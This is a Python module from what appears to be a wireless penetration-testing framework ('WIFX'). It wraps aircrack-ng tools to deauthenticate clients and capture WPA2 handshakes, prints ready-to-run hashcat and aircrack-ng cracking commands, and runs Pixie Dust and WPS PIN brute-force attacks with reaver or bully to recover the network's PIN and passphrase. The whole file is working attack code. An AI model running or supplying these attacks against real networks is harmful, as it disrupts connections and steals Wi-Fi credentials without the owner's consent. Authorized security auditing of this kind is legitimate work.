#!/usr/bin/env python3
# modules/handshake.py — WPA2 handshake capture + WPS audit for WIFX

import subprocess
import shutil
import os
import time
from modules.base import BaseModule
from utils.colors import Colors, print_status, print_section


class HandshakeCapture(BaseModule):

    NAME        = "wifi/handshake"
    DESCRIPTION = "WPA2 handshake capture — deauth + capture for offline cracking with hashcat/john"
    REFERENCES  = [
        "https://www.aircrack-ng.org/doku.php?id=cracking_wpa",
        "https://hashcat.net/wiki/doku.php?id=hashcat",
    ]

    def _define_options(self):
        self._add_option("INTERFACE", "",     True,  "Monitor-mode wireless interface (e.g. wlan0mon)")
        self._add_option("BSSID",     "",     True,  "Target AP BSSID (e.g. AA:BB:CC:DD:EE:FF)")
        self._add_option("CHANNEL",   "",     True,  "Target AP channel (e.g. 6)")
        self._add_option("SSID",      "",     False, "Target SSID (for output file naming)")
        self._add_option("TIMEOUT",   "60",   False, "Capture duration in seconds")
        self._add_option("DEAUTH",    "5",    False, "Number of deauth packets to send (0 = passive)")
        self._add_option("OUTPUT",    "captures", False, "Output directory for .cap file")

    def run(self) -> list:
        if not self._validate():
            return []

        iface   = self.get_option("INTERFACE").strip()
        bssid   = self.get_option("BSSID").strip().upper()
        channel = self.get_option("CHANNEL").strip()
        ssid    = self.get_option("SSID").strip() or bssid.replace(":", "")
        timeout = int(self.get_option("TIMEOUT") or 60)
        deauth  = int(self.get_option("DEAUTH") or 5)
        outdir  = self.get_option("OUTPUT") or "captures"

        # Dependency check
        for dep in ["airodump-ng", "aireplay-ng", "aircrack-ng"]:
            if not shutil.which(dep):
                print_status(f"Missing: {dep} — apt install aircrack-ng", "error")
                return []

        os.makedirs(outdir, exist_ok=True)
        cap_prefix = os.path.join(outdir, f"wifx_{ssid}")

        print_section(f"Handshake Capture — {bssid}")
        print_status(f"Target  : {Colors.WHITE}{bssid}{Colors.RESET} ch:{channel}", "info")
        print_status(f"Timeout : {Colors.WHITE}{timeout}s{Colors.RESET}", "info")
        print_status(f"Deauth  : {Colors.WHITE}{deauth} packets{Colors.RESET}", "info")
        print_status(f"Output  : {Colors.WHITE}{cap_prefix}-01.cap{Colors.RESET}", "info")
        print()

        # Start airodump-ng to capture
        print_status("Starting airodump-ng capture...", "run")
        airodump = subprocess.Popen(
            ["airodump-ng",
             "--bssid", bssid,
             "--channel", channel,
             "--write", cap_prefix,
             "--output-format", "cap",
             iface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(3)

        # Send deauth packets to force handshake
        if deauth > 0:
            print_status(f"Sending {deauth} deauth packet(s) to force handshake...", "run")
            try:
                subprocess.run(
                    ["aireplay-ng",
                     "--deauth", str(deauth),
                     "-a", bssid,
                     iface],
                    capture_output=True,
                    timeout=15,
                )
                print_status("Deauth sent. Waiting for handshake...", "info")
            except Exception as e:
                print_status(f"Deauth failed: {e}", "warn")
        else:
            print_status("Passive mode — waiting for handshake...", "info")

        # Wait for capture
        for i in range(timeout):
            time.sleep(1)
            print(f"  {Colors.DARK_GRAY}[{i+1:>3}/{timeout}s]{Colors.RESET} Capturing...", end="\r")

        airodump.terminate()
        print(" " * 60)

        # Verify handshake
        cap_file = f"{cap_prefix}-01.cap"
        findings = []

        if os.path.isfile(cap_file):
            print_status(f"Capture file: {Colors.CYAN}{cap_file}{Colors.RESET}", "ok")
            result = subprocess.run(
                ["aircrack-ng", cap_file],
                capture_output=True, text=True, timeout=10
            )
            if "WPA (1 handshake)" in result.stdout or "handshake" in result.stdout.lower():
                print_status(f"{Colors.GREEN}WPA handshake captured!{Colors.RESET}", "ok")
                print()
                print_status("Next steps for offline cracking:", "info")
                print(f"\n  {Colors.DARK_GRAY}# Convert to hashcat format{Colors.RESET}")
                print(f"  {Colors.WHITE}hcxpcapngtool -o {ssid}.hc22000 {cap_file}{Colors.RESET}")
                print(f"\n  {Colors.DARK_GRAY}# Crack with hashcat (mode 22000 = WPA2){Colors.RESET}")
                print(f"  {Colors.WHITE}hashcat -m 22000 {ssid}.hc22000 /usr/share/wordlists/rockyou.txt{Colors.RESET}")
                print(f"\n  {Colors.DARK_GRAY}# Or crack directly with aircrack-ng{Colors.RESET}")
                print(f"  {Colors.WHITE}aircrack-ng -w /usr/share/wordlists/rockyou.txt -b {bssid} {cap_file}{Colors.RESET}\n")

                findings.append(self._finding(
                    "HIGH", "WPA2 Handshake Captured",
                    bssid,
                    f"Saved to {cap_file} — ready for offline cracking"
                ))
            else:
                print_status("No handshake in capture — try increasing TIMEOUT or DEAUTH count.", "warn")
                findings.append(self._finding(
                    "INFO", "Capture Incomplete",
                    bssid,
                    f"No handshake detected in {cap_file}"
                ))
        else:
            print_status("Capture file not created — check interface and permissions.", "error")

        return findings


class WPSAudit(BaseModule):

    NAME        = "wifi/wps"
    DESCRIPTION = "WPS vulnerability audit — Pixie Dust attack and PIN brute force via reaver/bully"
    REFERENCES  = [
        "https://github.com/t6x/reaver-wps-fork-t6x",
        "https://github.com/aanarchyy/bully",
    ]

    def _define_options(self):
        self._add_option("INTERFACE", "",       True,  "Monitor-mode interface (e.g. wlan0mon)")
        self._add_option("BSSID",     "",       True,  "Target AP BSSID")
        self._add_option("CHANNEL",   "",       True,  "Target AP channel")
        self._add_option("METHOD",    "pixie",  False, "Attack method: pixie | pin | both")
        self._add_option("TIMEOUT",   "120",    False, "Attack timeout in seconds")
        self._add_option("TOOL",      "auto",   False, "Tool to use: auto | reaver | bully")

    def run(self) -> list:
        if not self._validate():
            return []

        iface   = self.get_option("INTERFACE").strip()
        bssid   = self.get_option("BSSID").strip().upper()
        channel = self.get_option("CHANNEL").strip()
        method  = self.get_option("METHOD").lower()
        timeout = int(self.get_option("TIMEOUT") or 120)
        tool    = self.get_option("TOOL").lower()

        # Auto-detect tool
        if tool == "auto":
            if shutil.which("reaver"):
                tool = "reaver"
            elif shutil.which("bully"):
                tool = "bully"
            else:
                print_status("No WPS tool found.", "error")
                print_status("Install: apt install reaver  or  apt install bully", "info")
                return []

        print_section(f"WPS Audit — {bssid}")
        print_status(f"Target  : {Colors.WHITE}{bssid}{Colors.RESET} ch:{channel}", "info")
        print_status(f"Method  : {Colors.WHITE}{method}{Colors.RESET}", "info")
        print_status(f"Tool    : {Colors.WHITE}{tool}{Colors.RESET}", "info")
        print()

        findings = []

        if method in ("pixie", "both"):
            findings += self._pixie_dust(iface, bssid, channel, tool, timeout)

        if method in ("pin", "both"):
            findings += self._pin_brute(iface, bssid, channel, tool, timeout)

        return findings

    def _pixie_dust(self, iface, bssid, channel, tool, timeout) -> list:
        print_status("Attempting Pixie Dust attack...", "run")
        findings = []

        try:
            if tool == "reaver":
                cmd = ["reaver", "-i", iface, "-b", bssid, "-c", channel,
                       "-K", "1", "-f", "-t", str(min(timeout, 60))]
            else:
                cmd = ["bully", iface, "-b", bssid, "-c", channel,
                       "-d", "-v", "3", "-T", str(min(timeout, 60))]

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 5)
            output = result.stdout + result.stderr

            if "WPS PIN:" in output or "PSK:" in output or "pixie" in output.lower():
                # Extract PIN and PSK if found
                pin_match = __import__("re").search(r"WPS PIN:\s*(\d+)", output)
                psk_match = __import__("re").search(r"WPA PSK:\s*['\"]?([^'\"\n]+)", output)
                pin = pin_match.group(1) if pin_match else "found"
                psk = psk_match.group(1) if psk_match else "check output"

                print(f"\n  {Colors.BOLD}{Colors.RED}[CRITICAL]{Colors.RESET} Pixie Dust SUCCESSFUL!")
                print(f"  {Colors.DARK_GRAY}WPS PIN  :{Colors.RESET} {Colors.WHITE}{pin}{Colors.RESET}")
                print(f"  {Colors.DARK_GRAY}WPA PSK  :{Colors.RESET} {Colors.BOLD}{Colors.GREEN}{psk}{Colors.RESET}\n")
                findings.append(self._finding(
                    "CRITICAL", "WPS Pixie Dust Attack Successful",
                    bssid, f"PIN: {pin} | PSK: {psk}"
                ))
            else:
                print_status("Pixie Dust attack failed — AP may not be vulnerable.", "warn")
                findings.append(self._finding(
                    "INFO", "Pixie Dust — Not Vulnerable", bssid,
                    "AP resisted Pixie Dust attack"
                ))
        except subprocess.TimeoutExpired:
            print_status("Pixie Dust timed out.", "warn")
        except Exception as e:
            print_status(f"Attack failed: {e}", "error")

        return findings

    def _pin_brute(self, iface, bssid, channel, tool, timeout) -> list:
        print_status("Starting WPS PIN brute force (this may take hours)...", "run")
        print_status(f"Running for {timeout}s then stopping.", "info")
        findings = []

        try:
            if tool == "reaver":
                cmd = ["reaver", "-i", iface, "-b", bssid, "-c", channel,
                       "-f", "-t", "5", "-d", "2"]
            else:
                cmd = ["bully", iface, "-b", bssid, "-c", channel, "-S"]

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            output = result.stdout + result.stderr

            if "WPS PIN:" in output:
                pin_match = __import__("re").search(r"WPS PIN:\s*(\d+)", output)
                psk_match = __import__("re").search(r"WPA PSK:\s*['\"]?([^'\"\n]+)", output)
                pin = pin_match.group(1) if pin_match else "?"
                psk = psk_match.group(1) if psk_match else "?"
                print(f"\n  {Colors.BOLD}{Colors.RED}[CRITICAL]{Colors.RESET} WPS PIN cracked!")
                print(f"  {Colors.DARK_GRAY}PIN:{Colors.RESET} {Colors.WHITE}{pin}{Colors.RESET}  "
                      f"{Colors.DARK_GRAY}PSK:{Colors.RESET} {Colors.BOLD}{Colors.GREEN}{psk}{Colors.RESET}\n")
                findings.append(self._finding("CRITICAL", "WPS PIN Cracked", bssid,
                                              f"PIN: {pin} | PSK: {psk}"))
            else:
                print_status("PIN brute force incomplete — increase TIMEOUT for full run.", "warn")

        except subprocess.TimeoutExpired:
            print_status(f"PIN brute force stopped after {timeout}s.", "info")
        except Exception as e:
            print_status(f"Attack failed: {e}", "error")

        return findings
